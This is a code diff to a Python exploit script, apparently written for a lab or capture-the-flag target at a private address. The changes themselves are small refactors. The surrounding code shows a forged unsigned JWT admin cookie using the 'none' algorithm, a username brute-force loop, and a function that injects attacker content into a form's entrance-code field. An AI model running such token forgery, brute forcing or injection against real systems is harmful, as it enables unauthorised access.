@@ -10,11 +10,8 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# If running locally
-url = "https://localhost/Dashboard"
-
-# If running remotely
-url = "https://10.0.2.61/Dashboard"
+url = "https://10.0.2.61/Dashboard"  # If running remotely
+url = "https://localhost/Dashboard"  # If running locally
 
 cookies = {
     "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6ImFkbWluMTgyMSIsImV4cCI6MTczMjM4NjM0M30."
@@ -81,7 +78,7 @@ def brute_force_username(cache: Optional[str] = None) -> Optional[str]:
             print(f"Attempting {username}", end="\r")
             result = get_page(username)
 
-            if not "Login" in result.text:
+            if "Login" not in result.text:
                 found = True
                 print()
                 break
@@ -125,7 +122,7 @@ def send_injection(username: str, content: str) -> bool:
     result = post_page(
         cookies=cookies,
         data={
-            "RallyId": 1,
+            "RallyId": "1",
             "AttendeeName": "Banana",
             "AttendeeEntranceCode": entrance_code + content,
             "__RequestVerificationToken": verification_token,
